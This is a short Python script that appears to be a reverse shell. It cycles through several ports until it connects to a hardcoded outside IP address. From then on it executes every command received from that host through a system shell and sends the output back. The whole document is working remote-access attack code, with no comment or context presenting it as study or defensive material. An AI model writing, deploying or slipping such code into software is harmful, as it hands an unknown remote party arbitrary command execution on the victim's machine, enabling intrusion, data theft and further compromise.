import socket
import time
import subprocess

print("it started")
mysocket = socket.socket()
connected = False
while not connected:
    for port in [21, 81, 443, 8000]:
        time.sleep(1)
        try:
            print("Trying", port, end=' ')
            mysocket.connect(("18.207.213.126", port))
            print("COnnected")
        except socket.error:
            print("Nope")
            continue
        else:
            print("Connected")
            connected = True
            break

while True:
    commandrequested = mysocket.recv(1024).decode()
    prochandle = subprocess.Popen(
        commandrequested,  shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    results, errors = prochandle.communicate()
    results = results + errors
    mysocket.send(results)
